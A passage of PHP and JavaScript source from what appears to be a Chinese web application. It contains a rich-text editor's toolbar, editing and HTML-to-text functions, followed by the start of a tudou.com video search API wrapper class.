                        document.writeln('                              <option value="<h1>">标题 1 &lt;h1&gt;</option>');
                        document.writeln('                              <option value="<h2>">标题 2 &lt;h2&gt;</option>');
                        document.writeln('                              <option value="<h3>">标题 3 &lt;h3&gt;</option>');
                        document.writeln('                              <option value="<h4>">标题 4 &lt;h4&gt;</option>');
                        document.writeln('                              <option value="<h5>">标题 5 &lt;h5&gt;</option>');
                        document.writeln('                              <option value="<h6>">标题 6 &lt;h6&gt;</option>');
                        document.writeln('                              <option value="<address>">地址 &lt;ADDR&gt;</option>');
                        document.writeln('                              <option value="<pre>">格式化文本 &lt;pre&gt;</option>');
                        document.writeln('                      </select>');
                        document.writeln('              </td>');
                        document.writeln('              <td>');
                        document.writeln('                      <select class=select id="fontname_' + rte + '" onchange="selectFont(\'' + rte + '\', this.id)">');
                        document.writeln('                              <option value="Font" selected>[字体]</option>');
                        document.writeln('                              <option value="宋体, Helvetica, sans-serif">宋体</option>');
                        document.writeln('                              <option value="仿宋, Helvetica, sans-serif">仿宋</option>');
                        document.writeln('                              <option value="黑体, Helvetica, sans-serif">黑体</option>');
                        document.writeln('                              <option value="隶书, Helvetica, sans-serif">隶书</option>');
                        document.writeln('                              <option value="幼圆, Helvetica, sans-serif">幼圆</option>');
                        document.writeln('                              <option value="Arial, Helvetica, sans-serif">Arial</option>');
                        document.writeln('                              <option value="Arial Narrow, Helvetica, sans-serif">Arial Narrow</option>');
                        document.writeln('                              <option value="Arial Black, Helvetica, sans-serif">Arial Black</option>');
                        document.writeln('                              <option value="Comic Sans MS, Courier, mono">Comic Sans MS</option>');
                        document.writeln('                              <option value="Courier, Courier, mono">Courier</option>');
                        document.writeln('                              <option value="Courier New, Courier, mono">Courier New</option>');
                        document.writeln('                              <option value="System, Times, serif">System</option>');
                        document.writeln('                              <option value="Times New Roman, Times, serif">Times New Roman</option>');
                        document.writeln('                              <option value="Verdana, Arial, Helvetica, sans-serif">Verdana</option>');
                        document.writeln('                              <option value="Wingdings, Arial, Helvetica, sans-serif">Wingdings</option>');
                        document.writeln('                      </select>');
                        document.writeln('              </td>');
                        document.writeln('              <td>');
                        document.writeln('                      <select unselectable="on" id="fontsize_' + rte + '" onchange="selectFont(\'' + rte + '\', this.id);">');
                        document.writeln('                              <option value="Size">[字号]</option>');
                        document.writeln('                              <option value="1">1</option>');
                        document.writeln('                              <option value="2">2</option>');
                        document.writeln('                              <option value="3">3</option>');
                        document.writeln('                              <option value="4">4</option>');
                        document.writeln('                              <option value="5">5</option>');
                        document.writeln('                              <option value="6">6</option>');
                        document.writeln('                              <option value="7">7</option>');
                        document.writeln('                      </select>');
                        document.writeln('              </td>');
                        document.writeln('              <td width="100%">');
                        document.writeln('              </td>');
                        document.writeln('      </tr>');
                        document.writeln('</table>');
                        document.writeln('<table bgcolor="#FFFFFF" class="tborder" cellpadding="0" cellspacing="1" id="Buttons2_' + rte + '" width="'+tablewidth+'" align="center" >');
                        document.writeln('      <tr>');
                        document.writeln('              <td>&nbsp;<a href="#screencontrol" id="bold" style="color:#000000;font-size:12px;text-decoration:none;" src="' + imagesPath + 'bold.gif" width="25" height="24" alt="粗体" title="粗体" onClick="rteCommand(\'' + rte + '\', \'bold\', \'\')"/><b/>粗</td>');
                        document.writeln('              <td>&nbsp;<a href="#screencontrol" style="color:#000000;font-size:12px;text-decoration:none;" src="' + imagesPath + 'italic.gif" width="25" height="24" alt="斜体" title="斜体" onClick="rteCommand(\'' + rte + '\', \'italic\', \'\')"/><b/>斜</td>');
                        document.writeln('              <td>&nbsp;<a href="#screencontrol" style="color:#000000;font-size:12px;text-decoration:none;" src="' + imagesPath + 'underline.gif" width="25" height="24" alt="下划线" title="下划线" onClick="rteCommand(\'' + rte + '\', \'underline\', \'\')"/><b/>下</td>');
                        document.writeln('              <td>&nbsp;<a href="#screencontrol" style="color:#000000;font-size:12px;text-decoration:none;" src="' + imagesPath + 'left_just.gif" width="25" height="24" alt="左对齐" title="左对齐" onClick="rteCommand(\'' + rte + '\', \'justifyleft\', \'\')"/><b/>左</td>');
                        document.writeln('              <td>&nbsp;<a href="#screencontrol" style="color:#000000;font-size:12px;text-decoration:none;" src="' + imagesPath + 'centre.gif" width="25" height="24" alt="居中" title="居中" onClick="rteCommand(\'' + rte + '\', \'justifycenter\', \'\')"/><b/>中</td>');
                        document.writeln('              <td>&nbsp;<a href="#screencontrol" style="color:#000000;font-size:12px;text-decoration:none;" src="' + imagesPath + 'right_just.gif" width="25" height="24" alt="右对齐" title="右对齐" onClick="rteCommand(\'' + rte + '\', \'justifyright\', \'\')"/><b/>右</td>');
                        document.writeln('              <td>&nbsp;<a href="#screencontrol" style="color:#000000;font-size:12px;text-decoration:none;" src="' + imagesPath + 'hr.gif" width="25" height="24" alt="水平线" title="水平线" onClick="rteCommand(\'' + rte + '\', \'inserthorizontalrule\', \'\')"/><b/>水</td>');
                        document.writeln('              <td>&nbsp;<a href="#screencontrol" style="color:#000000;font-size:12px;text-decoration:none;" src="' + imagesPath + 'numbered_list.gif" width="25" height="24" alt="编号" title="编号" onClick="rteCommand(\'' + rte + '\', \'insertorderedlist\', \'\')"/><b/>编</td>');
                        document.writeln('              <td>&nbsp;<a href="#screencontrol" style="color:#000000;font-size:12px;text-decoration:none;" src="' + imagesPath + 'list.gif" width="25" height="24" alt="项目符号" title="项目符号" onClick="rteCommand(\'' + rte + '\', \'insertunorderedlist\', \'\')"/><b/>项</td>');
                        document.writeln('              <td>&nbsp;<a href="#screencontrol" style="color:#000000;font-size:12px;text-decoration:none;" src="' + imagesPath + 'outdent.gif" width="25" height="24" alt="减小缩进" title="减小缩进" onClick="rteCommand(\'' + rte + '\', \'outdent\', \'\')"/><b/>小</td>');
                        document.writeln('              <td>&nbsp;<a href="#screencontrol" style="color:#000000;font-size:12px;text-decoration:none;" src="' + imagesPath + 'indent.gif" width="25" height="24" alt="增大缩进" title="增大缩进" onClick="rteCommand(\'' + rte + '\', \'indent\', \'\')"/><b/>大</td>');
                        document.writeln('              <td><div id="forecolor_' + rte + '">&nbsp;<a href="#screencontrol" style="color:#000000;font-size:12px;text-decoration:none;" src="' + imagesPath + 'textcolor.gif" width="25" height="24" alt="字体颜色" title="字体颜色" onClick="dlgColorPalette(\'' + rte + '\', \'forecolor\', \'\')"/><b/>字</div></td>');
                        document.writeln('              <td><div id="hilitecolor_' + rte + '">&nbsp;<a href="#screencontrol" style="color:#000000;font-size:12px;text-decoration:none;" src="' + imagesPath + 'bgcolor.gif" width="25" height="24" alt="背景颜色" title="背景颜色" onClick="dlgColorPalette(\'' + rte + '\', \'hilitecolor\', \'\')"/><b/>背</div></td>');
                        document.writeln('              <td>&nbsp;<a href="#screencontrol" style="color:#000000;font-size:12px;text-decoration:none;" src="' + imagesPath + 'hyperlink.gif" width="25" height="24" alt="插入链接" title="插入链接" onClick="dlgInsertLink(\'' + rte + '\', \'link\')"/><b/>链</td>');
                        document.writeln('              <td>&nbsp;<a href="#screencontrol" style="color:#000000;font-size:12px;text-decoration:none;" src="' + imagesPath + 'image.gif" width="25" height="24" alt="插入图片" title="插入图片" onClick="addImage(\'' + rte + '\')"/><b/>图</td>');
                        document.writeln('              <td><div id="table_' + rte + '">&nbsp;<a href="#screencontrol" style="color:#000000;font-size:12px;text-decoration:none;" src="' + imagesPath + 'insert_table.gif" width="25" height="24" alt="插入表格" title="插入表格" onClick="dlgInsertTable(\'' + rte + '\', \'table\', \'\')"/><b/>表</div></td>');
                        document.writeln('              <td>&nbsp;<a href="#screencontrol" style="color:#000000;font-size:12px;text-decoration:none;" src="' + imagesPath + 'undo.gif" width="25" height="24" alt="撤消" title="撤消" onClick="rteCommand(\'' + rte + '\', \'undo\')"/><b/>撤</td>');
                        document.writeln('              <td>&nbsp;<a href="#screencontrol" style="color:#000000;font-size:12px;text-decoration:none;" src="' + imagesPath + 'redo.gif" width="25" height="24" alt="恢复" title="恢复" onClick="rteCommand(\'' + rte + '\', \'redo\')"/><b/>恢</td>');
                        document.writeln('              <td width="100%"></td>');
                        document.writeln('      </tr>');
                        document.writeln('</table>');
                        document.writeln('</div>');
                        document.writeln('<div class="rteDiv">');
                }
                if (isIE)
                        document.writeln('<iframe id="' + rte + '" name="' + rte + '" width="' + width + 'px" height="' + height + 'px" src="' + includesPath + 'blank.htm"></iframe>');
                else
                        document.writeln('<iframe style="color:#777777; BORDER-BOTTOM:1px solid; BORDER-LEFT:1px solid; BORDER-RIGHT:1px solid; BORDER-TOP:0px solid;" id="' + rte + '" name="' + rte + '" width="' + width + 'px" height="' + height + 'px" src="' + includesPath + 'blank.htm"></iframe>');

                document.writeln('<iframe width="154" height="104" id="cp' + rte + '" src="<?php echo scriptpath()."?api=editor&action=selcolor"?>" marginwidth="0" marginheight="0" scrolling="no" style="visibility:hidden; position: absolute; top:10; left:10;"></iframe>');
                document.writeln('<input type="hidden" id="hdn' + rte + '" name="' + rte + '" value="">');
                document.writeln('</div>');
                
                document.getElementById('hdn' + rte).value = html;
                enableDesignMode(rte, html, readOnly);
        } else {
                if (!readOnly) {
                        document.writeln('<textarea name="' + rte + '" id="' + rte + '" style="width: ' + width + 'px; height: ' + height + 'px;">' + html + '</textarea>');
                } else {
                        document.writeln('<textarea name="' + rte + '" id="' + rte + '" style="width: ' + width + 'px; height: ' + height + 'px;" readonly>' + html + '</textarea>');
                }
        }
}

function enableDesignMode(rte, html, readOnly) {
        var frameHtml = "<html id=\"" + rte + "\">\n";
        frameHtml += "<head>\n";
        if (cssFile.length > 0) {
                frameHtml += "<link media=\"all\" type=\"text/css\" href=\"" + cssFile + "\" rel=\"stylesheet\">\n";
        } else {
                frameHtml += "<style>\n";
                frameHtml += "body {\n";
                frameHtml += "  background: #FFFFFF;\n";
                frameHtml += "  margin: 0px;\n";
                frameHtml += "  padding: 0px;\n";
                frameHtml += "}\n";
                frameHtml += "</style>\n";
        }
        frameHtml += "\n";

        if (iepst2 > 0)
        {
                //frameHtml += "<body><div>\n";
                frameHtml += "<div>\n";
                frameHtml += html + "\n</div>";
        }
        else
        {
                //frameHtml += "<body>\n";
                frameHtml += "\n";
                frameHtml += html + "\n";
        }

        frameHtml += "\n";
        frameHtml += "</html>";
        
        if (document.all) {
                var oRTE = frames[rte].document;
                oRTE.open();
                oRTE.write(frameHtml);
                oRTE.close();
                if (!readOnly) {
                        oRTE.designMode = "On";
                        frames[rte].document.attachEvent("onkeypress", function evt_ie_keypress(event) {ieKeyPress(event, rte);});
                }
        } else {
                try {
                        if (!readOnly) document.getElementById(rte).contentDocument.designMode = "on";
                        try {
                                var oRTE = document.getElementById(rte).contentWindow.document;
                                oRTE.open();
                                oRTE.write(frameHtml);
                                oRTE.close();
                                if (isGecko && !readOnly) {
                                        oRTE.addEventListener("keypress", geckoKeyPress, true);
                                }
                        } catch (e) {
                                alert("Error preloading content.");
                        }
                } catch (e) {
                        if (isGecko) {
                                setTimeout("enableDesignMode('" + rte + "', '" + html + "', " + readOnly + ");", 10);
                        } else {
                                return false;
                        }
                }
        }
}

function updateRTE(rte) {
        if (!isRichText) return;

        var readOnly = false;
        if (document.all) {
                if (frames[rte].document.designMode != "On") readOnly = true;
        } else {
                if (document.getElementById(rte).contentDocument.designMode != "on") readOnly = true;
        }

        if (isRichText && !readOnly)
                setHiddenVal(rte);
}

function setHiddenVal(rte) {
        var oHdnField = document.getElementById('hdn' + rte);

        if (oHdnField.value == null) oHdnField.value = "";
        if (document.all) {
                if (generateXHTML) {
                        oHdnField.value = get_xhtml(frames[rte].document.body, lang, encoding);
                } else{
                        <?php 
                        if (trim(request("editmodel")) == "code"){
                        ?>
                        oHdnField.value = frames[rte].document.body.innerText;
                        <?php 
                        }
                        else{
                        ?>
                        oHdnField.value = frames[rte].document.body.innerHTML;
                        <?php 
                        }
                        ?>
                }
        } else {
                if (generateXHTML) {
                        oHdnField.value = get_xhtml(document.getElementById(rte).contentWindow.document.body, lang, encoding);
                } else{
                        <?php 
                        if (trim(request("editmodel")) == "code"){
                        ?>
                        oHdnField.value = document.getElementById(rte).contentWindow.document.body.innerText;
                        <?php 
                        }
                        else{
                        ?>
                        oHdnField.value = document.getElementById(rte).contentWindow.document.body.innerHTML;
                        <?php 
                        }
                        ?>
                }
        }

        if (stripHTML(oHdnField.value.replace("&nbsp;", " ")) == "" &&
                oHdnField.value.toLowerCase().search("<hr") == -1 &&
                oHdnField.value.toLowerCase().search("<img") == -1) oHdnField.value = "";
}

function updateRTEs() {
        var vRTEs = allRTEs.split(";");
        for (var i = 0; i < vRTEs.length; i++) {
                updateRTE(vRTEs[i]);
        }
}

function rteCommand(rte, command, option) {
        var oRTE;
        if (document.all) {
                oRTE = frames[rte];
        } else {
                oRTE = document.getElementById(rte).contentWindow;
        }

        try {
                oRTE.focus();
                oRTE.document.execCommand(command, false, option);
                oRTE.focus();
        } catch (e) {
        }
}

function dlgColorPalette(rte, command) {
        setRange(rte);

        var oDialog = document.getElementById('cp' + rte);
        var buttonElement = document.getElementById(command + '_' + rte);
        var iLeftPos = getOffsetLeft(buttonElement);
        var iTopPos = getOffsetTop(buttonElement) + (buttonElement.offsetHeight + 4);
        if (isIE && ieversion < 5.5)
                iTopPos += 20;
        oDialog.style.left = (iLeftPos) + "px";
        oDialog.style.top = (iTopPos) + "px";

        if ((command == parent.command) && (rte == currentRTE)) {
                if (oDialog.style.visibility == "hidden") {
                        showHideElement(oDialog, 'show');
                } else {
                        showHideElement(oDialog, 'hide');
                }
        } else {
                var vRTEs = allRTEs.split(";");
                for (var i = 0; i < vRTEs.length; i++) {
                        showHideElement('cp' + vRTEs[i], 'hide');
                }
                showHideElement(oDialog, 'show');
        }

        parent.command = command;
        currentRTE = rte;
}

function dlgInsertTable(rte, command) {
        parent.command = command;
        currentRTE = rte;
        InsertTable = popUpWin('<?php echo scriptpath()."?api=editor&action=inserttable";?>', 'InsertTable', 360, 180, 'resizable=yes,status=no,');
}

function dlgInsertLink(rte, command) {
        parent.command = command;
        currentRTE = rte;
        InsertLink = popUpWin('<?php echo scriptpath()."?api=editor&action=insertlink";?>', 'InsertLink', 360, 180, 'resizable=yes,status=no,');

        setRange(rte);
        var linkText = '';
        if (isIE) {
                linkText = stripHTML(rng.htmlText);
        } else {
                linkText = stripHTML(rng.toString());
        }
        setLinkText(linkText);
}

function setLinkText(linkText) {
        try {
                window.InsertLink.document.linkForm.linkText.value = linkText;
        } catch (e) {
                setTimeout("setLinkText('" + linkText + "');", 10);
        }
}

function popUpWin (url, win, width, height, options) {
        var leftPos = (screen.availWidth - width) / 2;
        var topPos = (screen.availHeight - height) / 2;
        options += 'width=' + width + ',height=' + height + ',left=' + leftPos + ',top=' + topPos;
        return window.open(url, win, options);
}

function setColor(color) {
        var rte = currentRTE;
        var parentCommand = parent.command;
        
        if (document.all) {
                if (parentCommand == "hilitecolor") parentCommand = "backcolor";

                rng.select();
        }
        
        rteCommand(rte, parentCommand, color);
        showHideElement('cp' + rte, "hide");
}

function addImage(rte) {
        imagePath = prompt('请输入图片地址:', 'http://');                               
        if ((imagePath != null) && (imagePath != "")) {
                rteCommand(rte, 'InsertImage', imagePath);
        }
}

function getOffsetTop(elm) {
        var mOffsetTop = elm.offsetTop;
        var mOffsetParent = elm.offsetParent;
        var parents_up = 2;
        
        while(parents_up > 0) {
                mOffsetTop += mOffsetParent.offsetTop;
                mOffsetParent = mOffsetParent.offsetParent;
                parents_up--;
        }
        
        return mOffsetTop;
}

function getOffsetLeft(elm) {
        var mOffsetLeft = elm.offsetLeft;
        var mOffsetParent = elm.offsetParent;
        var parents_up = 2;
        
        while(parents_up > 0) {
                mOffsetLeft += mOffsetParent.offsetLeft;
                mOffsetParent = mOffsetParent.offsetParent;
                parents_up--;
        }
        
        return mOffsetLeft;
}

function selectFont(rte, selectname) {
        var idx = document.getElementById(selectname).selectedIndex;
        if (idx != 0) {
                var selected = document.getElementById(selectname).options[idx].value;
                var cmd = selectname.replace('_' + rte, '');
                rteCommand(rte, cmd, selected);
                document.getElementById(selectname).selectedIndex = 0;
        }
}

function insertHTML(html) {
        var rte = currentRTE;

        var oRTE;
        if (document.all) {
                oRTE = frames[rte];
        } else {
                oRTE = document.getElementById(rte).contentWindow;
        }
        
        oRTE.focus();
        if (document.all) {
                var oRng = oRTE.document.selection.createRange();
                oRng.pasteHTML(html);
                oRng.collapse(false);
                oRng.select();
        } else {
                oRTE.document.execCommand('insertHTML', false, html);
        }
}

function showHideElement(element, showHide) {
        if (document.getElementById(element)) {
                element = document.getElementById(element);
        }

        if (showHide == "show") {
                element.style.visibility = "visible";
        } else if (showHide == "hide") {
                element.style.visibility = "hidden";
        }
}

function setRange(rte) {
        var oRTE;
        if (document.all) {
                oRTE = frames[rte];
                var selection = oRTE.document.selection; 
                if (selection != null) rng = selection.createRange();
        } else {
                oRTE = document.getElementById(rte).contentWindow;
                var selection = oRTE.getSelection();
                rng = selection.getRangeAt(selection.rangeCount - 1).cloneRange();
        }
        return rng;
}

function stripHTML(oldString) {
        var newString = oldString.replace(/(<([^>]+)>)/ig,"");

        newString = newString.replace(/\r\n/g," ");
        newString = newString.replace(/\n/g," ");
        newString = newString.replace(/\r/g," ");

        newString = trim(newString);

        return newString;
}

function trim(inputString) {
   if (typeof inputString != "string") return inputString;
   var retValue = inputString;
   var ch = retValue.substring(0, 1);
        
   while (ch == " ") {
      retValue = retValue.substring(1, retValue.length);
      ch = retValue.substring(0, 1);
   }
   ch = retValue.substring(retValue.length - 1, retValue.length);
        
   while (ch == " ") {
      retValue = retValue.substring(0, retValue.length - 1);
      ch = retValue.substring(retValue.length - 1, retValue.length);
   }

   while (retValue.indexOf("  ") != -1) {
      retValue = retValue.substring(0, retValue.indexOf("  ")) + retValue.substring(retValue.indexOf("  ") + 1, retValue.length);
   }
   return retValue;
}

function geckoKeyPress(evt) {
        var rte = evt.target.id;

        if (evt.ctrlKey) {
                var key = String.fromCharCode(evt.charCode).toLowerCase();
                var cmd = '';
                switch (key) {
                        case 'b': cmd = "bold"; break;
                        case 'i': cmd = "italic"; break;
                        case 'u': cmd = "underline"; break;
                };

                if (cmd) {
                        rteCommand(rte, cmd, null);

                        evt.preventDefault();
                        evt.stopPropagation();
                }
        }
}

function ieKeyPress(evt, rte) {
        var key = (evt.which || evt.charCode || evt.keyCode);
        var stringKey = String.fromCharCode(key).toLowerCase();
}

function raiseButton(e) {
        var el = window.event.srcElement;
        
        className = el.className;
        if (className == 'rteImage' || className == 'rteImageLowered') {
                el.className = 'rteImageRaised';
        }
}

function normalButton(e) {
        var el = window.event.srcElement;
        
        className = el.className;
        if (className == 'rteImageRaised' || className == 'rteImageLowered') {
                el.className = 'rteImage';
        }
}

function lowerButton(e) {
        var el = window.event.srcElement;
        
        className = el.className;
        if (className == 'rteImage' || className == 'rteImageRaised') {
                el.className = 'rteImageLowered';
        }
}

function getText(strHtml)
{
        var cv_sh = strHtml.replace(/[\r\n]*/g, "");
        cv_sh = cv_sh.replace(/<[\s\/]*br(\s[^>]*>|[^>]*>)/gi, "\r\n");

        cv_sh = cv_sh.replace(/^<[\s]*p[\s]*>/i, "");
        cv_sh = cv_sh.replace(/<[\s]*\/+[\s]*p(\s[^>]*>|[^>]*>)/gi, "\r\n");

        cv_sh = cv_sh.replace(/<[\s]*li(\s[^>]*>|[^>]*>)/gi, "\r\n");
        cv_sh = cv_sh.replace(/<[\s\/]*blockquote(\s[^>]*>|[^>]*>)/gi, "\r\n");
        cv_sh = cv_sh.replace(/<[\s]*hr(\s[^>]*>|[^>]*>)/gi, "\r\n");
        cv_sh = cv_sh.replace(/<[\s]*\/+[\s]*tr(\s[^>]*>|[^>]*>)/gi, "\r\n");
        cv_sh = cv_sh.replace(/<[\s]*\/+[\s]*div(\s[^>]*>|[^>]*>)/gi, "\r\n");

        cv_sh = cv_sh.replace(/<[\s]*\/+[\s]*td(\s[^>]*>|[^>]*>)/gi, " ");

        cv_sh = cv_sh.replace(/<!--[\s\S]*?-->/g, "");

        cv_sh = cv_sh.replace(/<head>[\s\S]*?<\/head>/gi, "");
        cv_sh = cv_sh.replace(/<style[^>]*>[\s\S]*?<\/style>/gi, "");

        cv_sh = cv_sh.replace(/<[^>]*>/g, "");

        cv_sh = cv_sh.replace(/&amp;/g, "&");
        cv_sh = cv_sh.replace(/&#38;/g, "&");

        cv_sh = cv_sh.replace(/&lt;/g, "<");
        cv_sh = cv_sh.replace(/&#60;/g, "<");

        cv_sh = cv_sh.replace(/&gt;/g, ">");
        cv_sh = cv_sh.replace(/&#62;/g, ">");

        cv_sh = cv_sh.replace(/&quot;/g, "\"");
        cv_sh = cv_sh.replace(/&nbsp;/g, " ");

        cv_sh = cv_sh.replace(/^[\r\n]{0,2}|[\r\n]{0,2}$/g, "");

        return cv_sh;
}

function RemoveScript(strHtml)
{
        var cv_sh = strHtml.replace(/&lt;script[^>]*>[\s\S]*?&lt;\/script>/gi, "");
        cv_sh = cv_sh.replace(/&lt;/g, "<");
        return cv_sh.replace(/&#11;/g, "&lt;");
}

</script>

<?php 
}

function editorMain($formname,$url,$width,$formact){
?>
<BODY LANGUAGE=javascript onload="return window_onload()">
<table width="<?php echo $width;?>" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
<?php 
if ($formact != ""){
?>
<FORM ACTION="<?php echo $url;?>" METHOD=POST NAME="<?php echo $formname;?>">
<?php 
}
?>
        <tr> 
              <td align="left" style="border:0" height="88%"> 
                <input id="editmodel" type="hidden" name="editmodel" value="design">
<script language="JavaScript" type="text/javascript">
<!--
writeRichText('richedit', '<?php echo $this->editorEncode(decodeuri(trim(request("richedit"))));?>', '100%', 300, <?php  if (trim(request("button")) == ""){ ?>true<?php }else{?>false<?php }?>, false);
var mhtml = document.getElementById('editorborder').innerHTML;
var submitvar = '<input type="submit" class="button" value="发送" style="WIDTH: 50px" class=Bsbttn onclick="javascript:submiteditor();">';

function view2edit()
{
        rte = 'richedit';
        var oRTE;
        if (document.all) {
                oRTE = frames[rte];
        } else {
                oRTE = document.getElementById(rte).contentWindow;
        }

        if (document.getElementById('viewedit').value == '预览')        
        {
                oRTE.document.body.contentEditable="false";
                document.getElementById('viewedit').value = '编辑';
                document.getElementById('editmodel').value = 'view';
                document.getElementById('editorborder').innerHTML = mhtml;
                document.getElementById('editorsubmit').innerHTML = submitvar;
        }
        else if (document.getElementById('viewedit').value == '编辑')   
        {
                oRTE.document.body.contentEditable="true";
                oRTE.document.body.innerText = oRTE.document.body.innerHTML;
                document.getElementById('viewedit').value = '设计';
                document.getElementById('editmodel').value = 'code';
                document.getElementById('editorborder').innerHTML = '';
                cument.getElementById('editorsubmit').innerHTML = '';
        }
        else if (document.getElementById('viewedit').value == '设计')   
        {
                oRTE.document.designMode="On";
                oRTE.document.body.contentEditable="true";
                oRTE.document.body.innerHTML = oRTE.document.body.innerText;
                document.getElementById('viewedit').value = '预览';
                document.getElementById('editmodel').value = 'view';
                document.getElementById('editmodel').value = 'design';
                document.getElementById('editorborder').innerHTML = mhtml;
                document.getElementById('editorsubmit').innerHTML = submitvar;
        }
}       

//-->
</script>
                </td>
        </tr>
</table>
<table width="88%" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="">
        <tr>
                <td align="right" height="30" width=33%>
                </td>
                <td align="center" height="30" width=33%>
                        <span id="vieweditbutton"><input type="button" id='viewedit' class="button" value="预览" style="WIDTH: 50px" ID="editorsubmit" class=Bsbttn onclick="javascript:view2edit();">&nbsp;</span><span id="editorsubmit"><input type="submit" class="button" value="发送" style="WIDTH: 50px" class=Bsbttn onclick="javascript:submiteditor();"></span>&nbsp;<input type="button" class="button" value="取消" style="WIDTH: 50px" onclick="javascript:parent.location.href='viewmailbox.asp?GRSN=4379197'" class=Bsbttn>&nbsp;
                </td>
                <td align="right" height="30" width=33%>
                </td>
        </tr>
</table>
                </td>
        </tr>
</FORM>
</table>
<script language="JavaScript" type="text/javascript">
<!--
<?php 
if (trim(request("editmodel")) == "code"){
?>
        document.getElementById('editorborder').innerHTML = '';
        document.getElementById('vieweditbutton').innerHTML = '';
        document.getElementById('editorsubmit').innerHTML = submitvar;
        document.<?php echo $formname;?>.editmodel.value = 'code';
<?php 
}
?>
//-->
</script>

<?php 
}


}
?>

<?php 

// ---------------------------------------------------
//  Api.tudou.com - X3193媒体系统非标准独立类 v1.0
//  供能：实现媒体查询、播放和上传下载功能
//  实现：X3193API
//  供应：tudou.com
//  收藏：☆☆☆☆☆
//  时间：2011-06-08 12:53AM
//  行数：683行
// ---------------------------------------------------

class tudou_class{

var $appKey = '5522b8d49cf7bfd9';
var $previewer = '1';
var $forbidwords = "X3193.TK|夏宇";

function tudouviewer(){
	return $this->previewer;
}

function tudoumediaclassid(){
	$tudoumediaclassid[0] = array('code' => '0','type' => '所有');
	$tudoumediaclassid[1] = array('code' => '1','type' => '娱乐');
	$tudoumediaclassid[2] = array('code' => '3','type' => '乐活');
	$tudoumediaclassid[3] = array('code' => '5','type' => '搞笑');
	$tudoumediaclassid[4] = array('code' => '9','type' => '动画');
	$tudoumediaclassid[5] = array('code' => '10','type' => '游戏');
	$tudoumediaclassid[6] = array('code' => '14','type' => '音乐');
	$tudoumediaclassid[7] = array('code' => '15','type' => '体育');
	$tudoumediaclassid[8] = array('code' => '21','type' => '科技');
	$tudoumediaclassid[9] = array('code' => '22','type' => '电影');
	$tudoumediaclassid[10] = array('code' => '24','type' => '财富');
	$tudoumediaclassid[11] = array('code' => '25','type' => '教育');
	$tudoumediaclassid[12] = array('code' => '26','type' => '汽车');
	$tudoumediaclassid[13] = array('code' => '27','type' => '女性');
	$tudoumediaclassid[14] = array('code' => '29','type' => '热点');
	$tudoumediaclassid[15] = array('code' => '30','type' => '电视剧');
	$tudoumediaclassid[16] = array('code' => '31','type' => '综艺');
	$tudoumediaclassid[17] = array('code' => '32','type' => '风尚');
	$tudoumediaclassid[18] = array('code' => '99','type' => '原创');
	return $tudoumediaclassid;
}

function tudoumediaday(){
	$tudoumediaday[0] = array('day' => '','name' => '所有');
	$tudoumediaday[1] = array('day' => '30','name' => '30天');
	$tudoumediaday[2] = array('day' => '7','name' => '7天');
	return $tudoumediaday;
}

function tudoumediatime(){
	$tudoumediatime[0] = array('time' => '','name' => '所有');
	$tudoumediatime[1] = array('time' => 's','name' => '短视频');
	$tudoumediatime[2] = array('time' => 'm','name' => '中长视频');
	$tudoumediatime[3] = array('time' => 'l','name' => '长视频');
	return $tudoumediatime;
}

function tudoumediatype(){
	$tudoumediatype[0] = array('type' => 'v','name' => '视频');
	$tudoumediatype[1] = array('type' => 'a','name' => '音频');
	return $tudoumediatype;
}

function tudoumediaorder(){
	$tudoumediaorder[0] = array('order' => 's','name' => '匹配度');
	$tudoumediaorder[1] = array('order' => 't','name' => '发布时间');
	$tudoumediaorder[2] = array('order' => 'v','name' => '播放次数');
	$tudoumediaorder[3] = array('order' => 'd','name' => '节目时长');
	return $tudoumediaorder;
}

function tudoumedialist($keyword,$classid,$day,$time,$mediatype,$order,$page,$pagesize){
        	if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
        	}       
        	else{   
                	$ch = curl_init();
                	$url = "http://api.tudou.com/v3/gw?method=item.search&appKey=".$this->appKey."&format=json&kw=".encodeuri(iconv('gb2312','utf-8',$keyword))."&pageNo=".$page."&pageSize=".$pagesize."&channelId=".$classid."&inDays=".$day."&media=".$mediatype."&sort=".$order;
                	curl_setopt($ch, CURLOPT_URL, $url);
                	curl_setopt($ch, CURLOPT_HEADER, 0);
                	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                	curl_setopt($ch, CURLOPT_TIMEOUT, 50000);
                	$jsonstr = '';
                	while($jsonstr == ''){
                		$jsonstr = curl_exec($ch);
                	}	
                	//print_r($jsonstr);
                	//return;
                	$jsonstr = json_decode($jsonstr,true);
                	curl_close($ch);
        	}

        	if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
        		$medialist = array();
        		$medialist['page'] = $page;
        		$medialist['pagesize'] = $pagesize;
        		$medialist['pagecount'] = '';
        		$medialist['totalcount'] = '100';
        		$medialist['length'] = $medialist['totalcount'];
        		if ($medialist['length'] > $pagesize) $strpagesize = $pagesize; else $strpagesize = $medialist['length'];        	
        		//if ($medialist['length'] > $pagesize) $strpagesize = $pagesize; else $strpagesize = $medialist['length'];

        		for($i = 0;$i < $strpagesize;$i++){
                		//$objHdd = $objList->item($i);
             	            $medialist[$i]['itemCode'] = iconv('utf-8','gb2312','aaaaaaaaaaaa');
                        	$medialist[$i]['mediatags'] = iconv('utf-8','gb2312','aaaaaaaaaaaa');
                        	$medialist[$i]['mediatitle'] = iconv('utf-8','gb2312','bbbbbbbbbbbbbbb');
                        	$medialist[$i]['mediadescription'] = iconv('utf-8','gb2312','ccccccccccccccccc');
                        	$medialist[$i]['mediapicurl'] = iconv('utf-8','gb2312','hhhhhhhhhhhhhh');
                        	$medialist[$i]['mediatime'] = iconv('utf-8','gb2312','ggggggggggggggggg');
                        	$medialist[$i]['mediacreatetime'] = iconv('utf-8','gb2312','jjjjjjjjjjjjjj');
                        	$medialist[$i]['mediaownerid'] = iconv('utf-8','gb2312','kkkkkkkkkkkkkk');
                        	$medialist[$i]['mediaownername'] = iconv('utf-8','gb2312','mmmmmmmmmmmmmmmmm');
                        	$medialist[$i]['mediaownernickname'] = iconv('utf-8','gb2312','uuuuuuuuuuuuu');
                        	$medialist[$i]['mediaclass'] = iconv('utf-8','gb2312','oooooooooooo');
                        	$medialist[$i]['mediaplayerurl'] = iconv('utf-8','gb2312','ppppppppppp');
                        	$medialist[$i]['mediaitemurl'] = iconv('utf-8','gb2312','yyyyyyyyyyy');
